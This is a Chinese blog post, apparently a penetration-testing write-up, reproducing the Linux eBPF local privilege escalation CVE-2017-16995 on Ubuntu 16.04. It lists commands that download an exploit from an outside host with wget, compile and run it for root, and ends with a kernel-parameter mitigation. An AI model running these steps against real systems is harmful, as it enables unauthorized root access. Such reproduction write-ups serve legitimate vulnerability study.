# CVE-2017-16995 Ubuntu16.04 本地提权漏洞复现 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/8584177.html`](https://www.cnblogs.com/backlion/p/8584177.html)

## 0x01 前言

该漏洞由 Google project zero 发现。据悉，该漏洞存在于带有 eBPF bpf(2)系统（CONFIG_BPF_SYSCALL）编译支持的 Linux 内核中，是一个内存任意读写漏洞。该漏洞是由于 eBPF 验证模块的计算错误产生的。普通用户可以构造特殊的 BPF 来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。

## 0x02 漏洞影响

Linux Kernel Version 4.14-4.4(影响 Debian 和 Ubuntu 发行版)

## 0x03 测试环境

ubuntu16.04 x64

## 0x04 测试步骤

1.提权 exp 下载地址：

http://cyseclabs.com/exploits/upstream44.c

2.cd 切换到/opt 目录下并下载 exp：

cd /opt #前提看/opt 是不是 777 权限，不然编译和执行不了 exp

wget  http://cyseclabs.com/exploits/upstream44.c

![](img/92155b63fb31134b6dd4a26eded75c72.png)

3.有的 ubuntu 没有安装 gcc 需要执行安装：

sudo apt-get install gcc

如果缺少一些编译组件，则需要安装 lib 插件

apt-get install libc6-dev

4.然后利用 gcc 进行编译

gcc -o exp upstream44.c

![](img/6fbcc853257f01eba6dffa42c0bf1ca4.png)

5.将 exp 进行更改为可执行权限

chmod +x exp

![](img/5f1f38dfdca847be28a162d514dd5da4.png)

6.运行 exp 进行提权

./exp

![](img/3a23be270235a84c54fc0105845168f4.png)

![](img/622036cef05b9adec0933f9d1a8cc955.png) 

## 0x05 漏洞修复

目前暂未有明确的补丁升级方案。 临时建议用户在评估风险后，通过修改内核参数限制普通用户使用 bpf(2)系统调用：

echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled